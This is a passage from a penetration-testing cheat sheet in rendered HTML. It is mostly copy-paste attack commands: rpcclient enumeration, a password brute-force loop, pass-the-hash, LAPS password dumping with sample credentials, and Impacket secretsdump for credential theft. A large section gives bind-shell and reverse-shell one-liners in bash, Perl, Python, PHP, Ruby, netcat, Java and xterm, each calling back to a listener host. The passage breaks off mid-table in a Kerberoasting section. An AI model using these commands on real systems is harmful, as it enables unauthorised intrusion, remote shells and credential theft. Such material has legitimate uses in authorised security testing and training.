    <span class="k">Add</span> <span class="n">SUID</span> <span class="k">to</span> <span class="n">world</span><span class="o">-</span><span class="n">writeable</span> <span class="n">script</span> <span class="p">(</span><span class="n">chmod</span> <span class="n">u</span><span class="o">+</span><span class="n">s</span> <span class="o">&lt;</span><span class="n">file</span><span class="o">&gt;</span><span class="p">)</span>
    <span class="k">Add</span> <span class="n">init</span> <span class="n">script</span> <span class="p">(</span><span class="n">reboot</span> <span class="n">persistence</span><span class="p">)</span>
</pre></div>
</td></tr></table>

<h3 id="rpcclient">rpcclient<a class="headerlink" href="#rpcclient" title="Permanent link">&para;</a></h3>
<p><a href="http://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions">http://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions</a>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5
6</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">rpcclient</span> <span class="o">-</span><span class="n">U</span> <span class="ss">&quot;&quot;</span> <span class="o">-</span><span class="n">N</span> <span class="o">&lt;</span><span class="n">WinIPaddr</span><span class="o">&gt;</span>
    <span class="n">rpcclient</span> <span class="o">-</span><span class="n">U</span> <span class="o">&lt;</span><span class="n">username</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">WinIPaddr</span><span class="o">&gt;</span>
    <span class="n">rpcclient</span> <span class="err">$</span><span class="o">&gt;</span> <span class="n">srvinfo</span>
    <span class="n">rpcclient</span> <span class="err">$</span><span class="o">&gt;</span> <span class="n">enum</span>
    <span class="n">rpcclient</span> <span class="err">$</span><span class="o">&gt;</span> <span class="n">enumdomusers</span>
    <span class="n">rpcclient</span> <span class="err">$</span><span class="o">&gt;</span> <span class="n">queryuser</span> <span class="mi">500</span>
</pre></div>
</td></tr></table></p>
<p>Password bruteforce via rpcclient
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">for</span> <span class="nv">u</span> <span class="nv">in</span> `<span class="nv">cat</span> <span class="nv">users_sorted</span>.<span class="nv">txt</span>`<span class="c1">; do</span>
        <span class="nv">echo</span> <span class="o">-</span><span class="nv">n</span> <span class="s2">&quot;</span><span class="s">[*] user: $u</span><span class="s2">&quot;</span> <span class="o">&amp;&amp;</span> \
        <span class="nv">proxychains</span> <span class="nv">rpcclient</span> <span class="o">-</span><span class="nv">U</span> <span class="s2">&quot;</span><span class="s">domain\$u%$u</span><span class="s2">&quot;</span> <span class="o">-</span><span class="nv">c</span> <span class="s2">&quot;</span><span class="s">getusername;quit</span><span class="s2">&quot;</span> <span class="mi">10</span>.<span class="mi">9</span>.<span class="mi">8</span>.<span class="mi">40</span>
    <span class="nv">done</span>
</pre></div>
</td></tr></table></p>
<p>Pass the Hash Variant
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">pth</span><span class="o">-</span><span class="n">rpcclient</span> <span class="o">-</span><span class="n">U</span> <span class="ss">&quot;domain\name%hash&quot;</span> <span class="c1">--pw-nt-hash 10.4.128.41</span>
</pre></div>
</td></tr></table></p>
<h3 id="enum4linux">enum4linux<a class="headerlink" href="#enum4linux" title="Permanent link">&para;</a></h3>
<p>Domain Controller Anonymous Enumeration
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">enum4linux</span> -<span class="n">A</span> <span class="s">&lt;ip&gt;</span> | <span class="n">tee</span> <span class="s">&lt;ip&gt;</span>-<span class="n">anon-enum</span>.<span class="n">txt</span>
</pre></div>
</td></tr></table></p>
<h3 id="iptables">iptables<a class="headerlink" href="#iptables" title="Permanent link">&para;</a></h3>
<p><em>Append rules to top of the Input filter and make persistent</em>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">iptables</span> <span class="o">-</span><span class="n">I</span> <span class="k">INPUT</span> <span class="o">-</span><span class="n">p</span> <span class="n">tcp</span> <span class="c1">--dport 50050 -s &lt;ip address&gt; -j ACCEPT</span>
    <span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">iptables</span> <span class="o">-</span><span class="n">I</span> <span class="k">INPUT</span> <span class="o">-</span><span class="n">p</span> <span class="n">tcp</span> <span class="c1">--dport 22 -s &lt;ip address&gt; -j ACCEPT</span>
    <span class="n">service</span> <span class="n">netfilter</span><span class="o">-</span><span class="n">persistent</span> <span class="n">save</span>
    <span class="n">iptables</span> <span class="o">-</span><span class="n">L</span> <span class="o">-</span><span class="n">v</span>
</pre></div>
</td></tr></table></p>
<p><em>Delete rule</em>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">iptables</span> <span class="o">-</span><span class="n">D</span> <span class="k">INPUT</span> <span class="o">-</span><span class="n">i</span> <span class="n">eth0</span> <span class="o">-</span><span class="n">p</span> <span class="n">tcp</span> <span class="c1">--dport 443 -j ACCEPT</span>
</pre></div>
</td></tr></table></p>
<h3 id="ldapsearch">ldapsearch<a class="headerlink" href="#ldapsearch" title="Permanent link">&para;</a></h3>
<p>Obtain LAPS passwords for domain computers using the linux based ldapsearch tool</p>
<p><a href="https://room362.com/post/2017/dump-laps-passwords-with-ldapsearch/">Dump Laps Passwords with LDAPSearch by Rob Fuller</a>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nv">ldapsearch</span> <span class="o">-</span><span class="nv">x</span> <span class="o">-</span><span class="nv">h</span> <span class="mi">192</span>.<span class="mi">168</span>.<span class="mi">80</span>.<span class="mi">10</span> <span class="o">-</span><span class="nv">D</span> <span class="s2">&quot;</span><span class="s">helpdesk</span><span class="s2">&quot;</span> <span class="o">-</span><span class="nv">w</span> <span class="nv">ASDqwe123</span> <span class="o">-</span><span class="nv">b</span> <span class="s2">&quot;</span><span class="s">dc=sittingduck,dc=info</span><span class="s2">&quot;</span> <span class="s2">&quot;</span><span class="s">(ms-MCS-AdmPwd=*)</span><span class="s2">&quot;</span> <span class="nv">ms</span><span class="o">-</span><span class="nv">MCS</span><span class="o">-</span><span class="nv">AdmPwd</span>

    <span class="o">-</span><span class="nv">x</span> <span class="o">-</span> <span class="nv">Use</span> <span class="nv">basic</span> <span class="nv">authentication</span>
    <span class="o">-</span><span class="nv">h</span> <span class="mi">192</span>.<span class="mi">168</span>.<span class="mi">80</span>.<span class="mi">10</span> <span class="o">-</span> <span class="k">Connect</span> <span class="nv">to</span> <span class="nv">the</span> <span class="nv">Domain</span> <span class="nv">Controller</span> <span class="k">for</span> <span class="nv">ldap</span>
    <span class="o">-</span><span class="nv">D</span> <span class="s2">&quot;</span><span class="s">helpdesk</span><span class="s2">&quot;</span> <span class="o">-</span><span class="nv">w</span> <span class="nv">ASDqwe123</span> <span class="o">-</span> <span class="nv">Login</span> <span class="nv">as</span> <span class="nv">the</span> <span class="nv">helpdesk</span> <span class="nv">user</span>, <span class="nv">with</span> <span class="nv">the</span> <span class="nv">password</span> <span class="nv">ASDqwe123</span>
    <span class="o">-</span><span class="nv">b</span> <span class="s2">&quot;</span><span class="s">dc=sittingduck,dc=info</span><span class="s2">&quot;</span> <span class="o">-</span> <span class="nv">This</span> <span class="nv">loads</span> <span class="nv">the</span> <span class="nv">base</span> <span class="nv">LDAP</span> <span class="nv">object</span> <span class="nv">of</span> <span class="nv">the</span> <span class="nv">entire</span> <span class="nv">domain</span>.
    <span class="s2">&quot;</span><span class="s">(ms-MCS-AdmPwd=*)</span><span class="s2">&quot;</span> <span class="o">-</span> <span class="nv">Filter</span> <span class="nv">out</span> <span class="nv">any</span> <span class="nv">objects</span> <span class="nv">that</span> <span class="nv">I</span> <span class="nv">can</span><span class="nv">t</span> <span class="nv">see</span> <span class="nv">a</span> <span class="nv">value</span> <span class="k">for</span> <span class="nv">ms</span><span class="o">-</span><span class="nv">MCS</span><span class="o">-</span><span class="nv">AdmPwd</span> <span class="k">for</span>. <span class="ss">(</span><span class="k">If</span> <span class="nv">you</span> <span class="nv">have</span> <span class="nv">rights</span> <span class="nv">as</span> <span class="nv">that</span> <span class="nv">user</span> <span class="nv">to</span> <span class="nv">see</span> <span class="nv">even</span> <span class="nv">one</span> <span class="nv">Administrator</span> <span class="nv">password</span>, <span class="nv">this</span> <span class="nv">will</span> <span class="k">show</span> <span class="nv">it</span>.<span class="ss">)</span>
    <span class="nv">ms</span><span class="o">-</span><span class="nv">MCS</span><span class="o">-</span><span class="nv">AdmPwd</span> <span class="o">-</span> <span class="nv">Only</span> <span class="k">show</span> <span class="nv">me</span> <span class="nv">the</span> <span class="nv">ms</span><span class="o">-</span><span class="nv">MCS</span><span class="o">-</span><span class="nv">AdmPwd</span> <span class="nv">object</span> <span class="ss">(</span><span class="nv">which</span> <span class="nv">by</span> <span class="nv">default</span> <span class="nv">includes</span> <span class="nv">the</span> <span class="nv">object</span> <span class="nv">name</span> <span class="nv">and</span> <span class="nv">DN</span> <span class="nv">so</span> <span class="nv">you</span> <span class="nv">will</span> <span class="nv">still</span> <span class="nv">know</span> <span class="nv">what</span> <span class="nv">host</span> <span class="nv">it</span> <span class="nv">belongs</span> <span class="nv">to</span><span class="ss">)</span>
</pre></div>
</td></tr></table></p>
<h3 id="nfs">NFS<a class="headerlink" href="#nfs" title="Permanent link">&para;</a></h3>
<p>List NFS Mounts on remote host
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">showmount</span> <span class="o">-</span><span class="n">e</span> <span class="o">&lt;</span><span class="n">ipaddr</span><span class="o">&gt;</span>
</pre></div>
</td></tr></table></p>
<p>Check NFS share counts in a loop
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    #<span class="nv">cat</span> <span class="nv">nfs</span>.<span class="nv">results</span>.<span class="nv">msf</span> <span class="o">|</span><span class="nv">grep</span> <span class="o">-|</span><span class="nv">cut</span> <span class="o">-</span><span class="nv">d</span><span class="s1">&#39;</span><span class="s">-</span><span class="s1">&#39;</span> <span class="o">-</span><span class="nv">f2</span><span class="o">|</span><span class="nv">cut</span> <span class="o">-</span><span class="nv">d</span><span class="s1">&#39;</span><span class="s"> </span><span class="s1">&#39;</span> <span class="o">-</span><span class="nv">f2</span>,<span class="mi">5</span><span class="o">|</span><span class="nv">sed</span> <span class="s1">&#39;</span><span class="s">s/ /:/g</span><span class="s1">&#39;</span>

    <span class="k">for</span> <span class="nv">server</span> <span class="nv">in</span> $<span class="ss">(</span><span class="nv">cat</span> <span class="nv">nfs</span>.<span class="nv">shares</span><span class="ss">)</span><span class="c1">; do</span>
        <span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">[*] Checking $server</span><span class="s2">&quot;</span>
        <span class="nv">mount</span> <span class="o">-</span><span class="nv">o</span> <span class="nv">nolock</span>,<span class="nv">nfsvers</span><span class="o">=</span><span class="mi">3</span> $<span class="nv">server</span> <span class="o">/</span><span class="nv">mnt</span><span class="o">/</span><span class="nv">n4s_backup</span>
        <span class="nv">ls</span> <span class="o">/</span><span class="nv">mnt</span><span class="o">/</span><span class="nv">n4s_backup</span>
        <span class="nv">umount</span> <span class="o">/</span><span class="nv">mnt</span><span class="o">/</span><span class="nv">n4s_backup</span>
    <span class="nv">done</span>
</pre></div>
</td></tr></table></p>
<h3 id="shells">Shells<a class="headerlink" href="#shells" title="Permanent link">&para;</a></h3>
<h4 id="tty-shells">TTY Shells<a class="headerlink" href="#tty-shells" title="Permanent link">&para;</a></h4>
<p><a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">http://pentestmonkey.net/blog/post-exploitation-without-a-tty</a></p>
<p>Upgrade your shell to a full TTY
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span>

    <span class="n">echo</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;/bin/bash&#39;</span><span class="p">)</span>

    <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">i</span>

    <span class="n">perl</span> <span class="err"></span><span class="n">e</span> <span class="s1">&#39;exec &quot;/bin/sh&quot;;&#39;</span>

    <span class="n">perl</span><span class="p">:</span> <span class="k">exec</span> <span class="s2">&quot;/bin/sh&quot;</span><span class="p">;</span>

    <span class="n">ruby</span><span class="p">:</span> <span class="k">exec</span> <span class="s2">&quot;/bin/sh&quot;</span>

    <span class="n">lua</span><span class="p">:</span> <span class="n">os</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
</pre></div>
</td></tr></table></p>
<p>(From within IRB)
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">exec</span> <span class="s2">&quot;</span><span class="s">/bin/sh</span><span class="s2">&quot;</span>
</pre></div>
</td></tr></table></p>
<p>(From within vi)
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="p">:</span><span class="o">!</span><span class="n">bash</span>
</pre></div>
</td></tr></table></p>
<p>(From within vi)
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="p">:</span><span class="k">set</span> <span class="n">shell</span><span class="o">=/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="p">:</span><span class="n">shell</span>
</pre></div>
</td></tr></table></p>
<p>(From within nmap)
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="o">!</span><span class="n">sh</span>
</pre></div>
</td></tr></table></p>
<h4 id="bind-shells">Bind Shells<a class="headerlink" href="#bind-shells" title="Permanent link">&para;</a></h4>
<p><a href="https://github.com/infodox/exploits/blob/master/payloads/linux/perl.py">https://github.com/infodox/exploits/blob/master/payloads/linux/perl.py</a></p>
<p>Perl Bind Shell (Port 1000)
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nv">perl</span> <span class="o">-</span><span class="nv">e</span> <span class="s1">&#39;</span><span class="s">use Socket;$p=10000;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));bind(S,sockaddr_in($p, INADDR_ANY));listen(S, SOMAXCONN);for(; $p= accept(C, S); close C) {open(STDIN,&quot;&gt;&amp;C&quot;);open(STDOUT,&quot;&gt;&amp;C&quot;);open(STDERR,&quot;&gt;&amp;C&quot;);exec(&quot;/usr/bin/bash -i&quot;);};</span><span class="s1">&#39;</span>
</pre></div>
</td></tr></table></p>
<h4 id="reverse-shells">Reverse Shells<a class="headerlink" href="#reverse-shells" title="Permanent link">&para;</a></h4>
<p>Bash
Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&gt;&amp;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="mi">10</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="o">/</span><span class="mi">8080</span> <span class="mi">0</span><span class="o">&gt;&amp;</span><span class="mi">1</span>
</pre></div>
</td></tr></table></p>
<p>PERL</p>
<p>Heres a shorter, feature-free version of the perl-reverse-shell:
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nv">perl</span> <span class="o">-</span><span class="nv">e</span> <span class="s1">&#39;</span><span class="s">use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};</span><span class="s1">&#39;</span>
</pre></div>
</td></tr></table></p>
<p>Python
This was tested under Linux / Python 2.7:
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</span>
</pre></div>
</td></tr></table></p>
<p>PHP</p>
<p>This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesnt work, try 4, 5, 6
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nv">php</span> <span class="o">-</span><span class="nv">r</span> <span class="s1">&#39;</span><span class="s">$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);</span><span class="s1">&#39;</span>
</pre></div>
</td></tr></table></p>
<p>Ruby
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nv">ruby</span> <span class="o">-</span><span class="nv">rsocket</span> <span class="o">-</span><span class="nv">e</span><span class="s1">&#39;</span><span class="s">f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)</span><span class="s1">&#39;</span>
</pre></div>
</td></tr></table></p>
<p>Netcat
Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which dont support the -e option.
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">nc</span> <span class="o">-</span><span class="n">e</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span> <span class="mi">10</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span> <span class="mi">1234</span>
</pre></div>
</td></tr></table></p>
<p>If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">rm</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span><span class="p">;</span><span class="n">mkfifo</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span><span class="p">;</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span><span class="o">|/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">i</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span><span class="o">|</span><span class="n">nc</span> <span class="mi">10</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span> <span class="mi">1234</span> <span class="o">&gt;/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span>
</pre></div>
</td></tr></table></p>
<p>Java
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nv">r</span> <span class="o">=</span> <span class="nv">Runtime</span>.<span class="nv">getRuntime</span><span class="ss">()</span>
    <span class="nv">p</span> <span class="o">=</span> <span class="nv">r</span>.<span class="k">exec</span><span class="ss">(</span>[<span class="s2">&quot;</span><span class="s">/bin/bash</span><span class="s2">&quot;</span>,<span class="s2">&quot;</span><span class="s">-c</span><span class="s2">&quot;</span>,<span class="s2">&quot;</span><span class="s">exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done</span><span class="s2">&quot;</span>] <span class="nv">as</span> <span class="nv">String</span>[]<span class="ss">)</span>
    <span class="nv">p</span>.<span class="nv">waitFor</span><span class="ss">()</span>
</pre></div>
</td></tr></table></p>
<p>xterm</p>
<p>One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">xterm</span> <span class="o">-</span><span class="n">display</span> <span class="mi">10</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span>
</pre></div>
</td></tr></table></p>
<p>To catch the incoming xterm, start an X-Server (:1  which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">Xnest</span> <span class="p">:</span><span class="mi">1</span>
</pre></div>
</td></tr></table></p>
<p>yourll need to authorise the target to connect to you (command also run on your host):
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">xhost</span> <span class="o">+</span><span class="n">targetip</span>
</pre></div>
</td></tr></table></p>
<h3 id="ssh-tunnels">SSH Tunnels<a class="headerlink" href="#ssh-tunnels" title="Permanent link">&para;</a></h3>
<p>Send data over ssh to port 9000 on target</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">ssh</span> <span class="o">-</span><span class="n">L</span> <span class="mi">8090</span><span class="o">:</span><span class="nl">localhost</span><span class="p">:</span><span class="mi">9000</span> <span class="n">james</span><span class="mf">@123.123.123</span>
</pre></div>
</td></tr></table>

<p>Send data over ssh to port 80 on target through jumphost</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">ssh</span> <span class="o">-</span><span class="n">A</span> <span class="o">-</span><span class="n">t</span> <span class="o">-</span><span class="n">p22</span> <span class="o">-</span><span class="n">L</span> <span class="mi">8800</span><span class="o">:</span><span class="nl">localhost</span><span class="p">:</span><span class="mi">8800</span> <span class="n">james</span><span class="mf">@123.001.123.321</span> <span class="o">-</span><span class="n">t</span> <span class="n">ssh</span> <span class="o">-</span><span class="n">L</span> <span class="mi">8800</span><span class="o">:</span><span class="nl">localhost</span><span class="p">:</span><span class="mi">80</span> <span class="n">james</span><span class="mf">@124.123.122</span>
</pre></div>
</td></tr></table>

<p>Start ssh using existing connections
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">nano</span> <span class="o">~/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">config</span>
    <span class="n">ControlMaster</span> <span class="n">auto</span>
    <span class="n">ControlPath</span> <span class="o">~/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">control</span><span class="p">:</span><span class="o">%</span><span class="n">h</span><span class="p">:</span><span class="o">%</span><span class="n">p</span><span class="p">:</span><span class="o">%</span><span class="n">r</span>
</pre></div>
</td></tr></table></p>
<h3 id="impacket">Impacket<a class="headerlink" href="#impacket" title="Permanent link">&para;</a></h3>
<p>Source: <a href="https://github.com/CoreSecurity/impacket/releases/tag/impacket_0_9_15">https://github.com/CoreSecurity/impacket/releases/tag/impacket_0_9_15</a></p>
<h4 id="install-impacket-on-windows">Install impacket on Windows<a class="headerlink" href="#install-impacket-on-windows" title="Permanent link">&para;</a></h4>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">CoreSecurity</span><span class="o">/</span><span class="n">impacket</span><span class="p">.</span><span class="n">git</span>
</pre></div>
</td></tr></table>

<p>Download VC++ For Python 2.7 (Needed to compile some modules)</p>
<ul>
<li><a href="https://www.microsoft.com/en-us/download/details.aspx?id=44266">https://www.microsoft.com/en-us/download/details.aspx?id=44266</a></li>
</ul>
<p>Install necessary modules (You may need to install pip first)</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">python</span> <span class="o">-</span><span class="n">m</span> <span class="n">pip</span> <span class="n">install</span> <span class="n">pycrypto</span> <span class="n">pyasn1</span> <span class="n">pyOpenSSL</span> <span class="n">pyReadline</span> <span class="n">ldapdomaindump</span>
</pre></div>
</td></tr></table>

<p>You can also download the PyCrypto binary if it fails to compile</p>
<ul>
<li><a href="http://www.voidspace.org.uk/downloads/pycrypto26/pycrypto-2.6.win32-py2.7.exe">http://www.voidspace.org.uk/downloads/pycrypto26/pycrypto-2.6.win32-py2.7.exe</a></li>
</ul>
<h4 id="secretsdump">Secretsdump<a class="headerlink" href="#secretsdump" title="Permanent link">&para;</a></h4>
<p>Attempt to dump credentials from a remote machine via Pass the Hash
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="w">    </span><span class="n">python</span><span class="w"> </span><span class="n">secretsdump</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="p">.</span><span class="o">/</span><span class="n">localadmin</span><span class="nv">@computername</span><span class="p">.</span><span class="k">domain</span><span class="p">.</span><span class="n">com</span><span class="w"> </span><span class="o">-</span><span class="n">hashes</span><span class="w"> </span><span class="nl">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">21306681</span><span class="n">c738c3ed2d615e29be1574a3</span><span class="w"></span>
</pre></div>
</td></tr></table></p>
<p>Dump domain password hashes remotely via Volume Shadow Copy
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="w">    </span><span class="nl">c</span><span class="p">:</span><span class="err">\</span><span class="n">users</span><span class="err">\</span><span class="n">username</span><span class="err">\</span><span class="n">appdata</span><span class="err">\</span><span class="k">local</span><span class="err">\</span><span class="n">temp</span><span class="err">\</span><span class="n">sd</span><span class="p">.</span><span class="n">exe</span><span class="w"> </span><span class="k">domain</span><span class="o">/</span><span class="nl">username</span><span class="p">:</span><span class="n">password</span><span class="nv">@dchostname</span><span class="w"> </span><span class="o">-</span><span class="n">just</span><span class="o">-</span><span class="n">dc</span><span class="w"> </span><span class="o">-</span><span class="k">use</span><span class="o">-</span><span class="n">vss</span><span class="w"> </span><span class="o">-</span><span class="n">outputfile</span><span class="w"></span>
</pre></div>
</td></tr></table></p>
<h4 id="getuserspnspy">GetUserSPNS.py<a class="headerlink" href="#getuserspnspy" title="Permanent link">&para;</a></h4>
<p>This is the easiest way to gather SPN tickets in the correct format for cracking with John or Hashcat
Source: <a href="https://room362.com/post/2016/kerberoast-pt2/">https://room362.com/post/2016/kerberoast-pt2/</a>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
